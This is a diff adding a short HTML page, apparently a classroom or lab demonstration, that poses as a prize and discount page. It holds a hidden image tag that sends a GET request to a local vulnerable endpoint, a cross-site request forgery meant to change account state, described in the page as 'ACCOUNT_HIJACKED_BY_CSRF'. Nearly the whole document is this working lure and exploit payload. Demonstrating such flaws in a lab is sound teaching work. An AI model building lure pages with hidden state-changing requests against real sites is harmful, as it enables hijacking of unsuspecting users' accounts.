@@ -1,0 +1,18 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Member 4 Exploit - Win a Prize!</title>
+</head>
+<body>
+    <h1>Congratulations! Claiming your special discount...</h1>
+    <p>Please wait while the page completes your verification...</p>
+
+    <!-- EXPLOIT PAYLOAD: Malicious image request triggering GET state change -->
+    <img src="http://127.0.0.1:5004/vuln?status=ACCOUNT_HIJACKED_BY_CSRF" 
+         alt="Invisible Exploit" 
+         style="display:none;" />
+
+    <p><em>Notice: An invisible &lt;img&gt; tag has just requested the vulnerable state-changing URL in the background.</em></p>
+</body>
+</html>
